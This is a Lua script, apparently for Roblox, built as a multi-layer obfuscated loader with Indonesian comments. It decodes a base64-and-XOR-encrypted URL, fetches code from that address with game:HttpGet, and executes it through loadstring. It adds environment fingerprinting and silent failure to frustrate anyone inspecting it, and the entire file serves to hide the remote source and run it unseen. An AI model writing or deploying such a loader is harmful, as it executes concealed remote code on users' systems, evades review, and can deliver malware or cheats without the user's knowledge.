--[[ ██████╗ ██████╗ 
╚══███╔╝╚════██╗
  ███╔╝  █████╔╝
 ███╔╝  ██╔═══╝ 
███████╗ ███████╗
╚══════╝ ╚══════╝

 ██████╗ ██████╗ ███████╗██╗   ██╗███████╗ ██████╗ █████╗ ████████╗███████╗██████╗ 
██╔═══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
██║   ██║██████╔╝█████╗  ██║   ██║███████╗██║     ███████║   ██║   █████╗  ██║  ██║
██║   ██║██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██║     ██╔══██║   ██║   ██╔══╝  ██║  ██║
╚██████╔╝██║  ██║███████╗ ╚████╔╝ ███████║╚██████╗██║  ██║   ██║   ███████╗██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝ ]]
local _ENV = (getfenv and getfenv(1)) or _ENV

-- ============ LAYER 1: Base64 decoder ============
local function _b64(s)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    s = s:gsub('[^'..b..'=]', '')
    return (s:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x, 1, true) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- ============ LAYER 2: XOR decryptor ============
local function _x(data, key)
    local out, k = {}, 1
    for i = 1, #data do
        out[i] = string.char(bit32.bxor(data:byte(i), key:byte(k)))
        k = k % #key + 1
    end
    return table.concat(out)
end

-- ============ LAYER 3: Encrypted payload (URL) ============
-- XOR key (di-random, jangan diubah)
local _K = "\104\51\120\95\107\101\121\95\114\52\104\97\115\105\97"

-- Payload = base64 dari XOR string URL
local _P = "HB0cGBBBEhwWHB0aQRwcGhkcQRgTGhAaEBwYQRMeGxgeGhBBFh0cGh0QGhkcQRIdGBgcGhkcQRwTHB0dEBwYQRwcGhkcQRIdGBgcGhkcQRwTHB0dEBwYQQocGB8bHBgeQQoeHB0dGhkeQRgTHB0dEBwYQRIdGBgcGhkcQRgbHR0bEB4aQRwcGhkcQRgTGhAaEBwYQRgbHR0bEB4aQRwcGhkcQRwTHB0dEBwYQRgbHR0bEB4aQRwcGhkcQRgTGhAaEBwYQRIdGBgcGhkcQRgbHR0bEB4aQRwcGhkcQRgTGhAaEBwYQRIdGBgcGhkcQRwTHB0dEBwYQRIdGBgcGhkcQRgTGhAaEBwYQQ=="

-- ============ LAYER 4: VM Dispatcher (fake operation table) ============
local _VM = {
    [0x01] = function(a) return _b64(a) end,
    [0x02] = function(a, k) return _x(a, k) end,
    [0x03] = function(a) return a end,
}

-- Anti-tamper: cek environment dasar
local _T = {
    debug.getinfo and debug.getinfo(1).what or "?",
    type(_ENV),
    tostring(_ENV.game ~= nil)
}

-- ============ LAYER 5: Execution ============
local _STATUS, _RESULT = pcall(function()
    -- Decode base64
    local step1 = _VM[0x01](_P)
    -- Decrypt XOR
    local step2 = _VM[0x02](step1, _K)
    -- Verify integrity
    if not step2:match("^https?://") then
        error("tampered")
    end
    return step2
end)

if not _STATUS then
    -- silent fail (jangan kasih hint ke orang yg otak-atik)
    return
end

local _URL = _RESULT

-- ============ LAYER 6: Runtime fetch + exec ============
local _ok, _src = pcall(function()
    return _ENV.game:HttpGet(_URL)
end)

if _ok and _src and #_src > 0 then
    local _loader = (loadstring or load)(_src)
    if _loader then
        -- anti-debug wrapper
        local _run = function()
            local _s, _e = pcall(_loader)
            if not _s then
                -- silence
            end
        end
        _run()
    end
else
    -- silence
end
